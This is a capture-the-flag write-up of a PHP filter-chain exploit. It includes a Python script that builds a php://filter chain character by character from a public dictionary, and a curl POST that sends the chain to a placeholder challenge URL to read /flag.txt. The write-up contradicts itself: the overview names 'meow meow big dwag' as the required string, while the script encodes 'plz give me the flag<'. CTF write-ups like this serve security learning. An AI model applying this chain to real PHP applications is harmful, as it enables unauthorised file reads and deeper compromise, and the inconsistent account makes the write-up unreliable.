Vulnerability Overview

https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT the conversions used in script will be found here in res directory.
The web application is vulnerable to PHP filter chaining, which allows the manipulation of input data through various PHP filters. By combining filters like convert.base64-encode, convert.iconv, and string.strip_tags, we can transform the input into a valid flag and bypass certain restrictions.

The PHP script processes user-supplied input through a series of filters. The script specifically checks for a specific result (i.e., "meow meow big dwag") and returns the contents of /flag.txt when matched.
Exploit Strategy

    Input Filtering:

        The application uses php://filter/$filter/resource=/dev/null to filter input. The user is able to provide a filter string that the application applies to a resource.

        The filter string is passed as a POST parameter named filter.

    Exploit Overview:

        The main task was to construct a filter chain that, when decoded and processed, results in the string "meow meow big dwag".

        Once this string is produced, the PHP script checks if it matches the expected output. If it does, the flag is returned from the /flag.txt file.

    Base64 Payload:

        The challenge uses Base64 encoding to hide the string. The payload is encoded and then processed through various filters to avoid detection.

    Obfuscation Through PHP Filters:

        The exploit applies multiple layers of encoding and decoding using filters like:

            convert.iconv.UTF8.CSISO2022KR

            convert.base64-encode

            convert.base64-decode

            string.strip_tags

        These filters manipulate the input string, ensuring that invalid characters like = are removed, and the expected output is achieved.

    File Creation for Each Character:

        The PHP filters for each character of the Base64-encoded string were stored in files within the ./res/ directory. Each file contained a filter chain corresponding to a specific character in the string.

        These files were named after the hexadecimal representation of the character's ASCII value (e.g., 'p' → 70, 'l' → 6c).

    Exploit Execution:

        The filter chain is sent via a POST request with the crafted filter string.

        If the filter chain successfully reconstructs the string, the script returns the contents of /flag.txt.

Exploit Execution
Step 1: Craft the Filter Chain

The Python script was used to generate the necessary filter chain for each character in the Base64 payload:

from base64 import b64encode

# Base64 payload
payload = b"plz give me the flag<"
base64_payload = b64encode(payload).decode().replace("=", "")

filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
    filters += open("./res/" + (str(hex(ord(c)))).replace("0x", "")).read() + "|"
    filters += "convert.base64-decode|"
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"
filters += "|string.strip_tags"

Step 2: Submit the Payload

The payload was submitted via a POST request with the following parameters:

curl -X POST http://challenge-url.com -d "filter=GENERATED_FILTER_CHAIN"

Step 3: Retrieve the Flag

If the crafted filter chain correctly reconstructed, the response from the PHP script would return the contents of /flag.txt, which contained the flag.
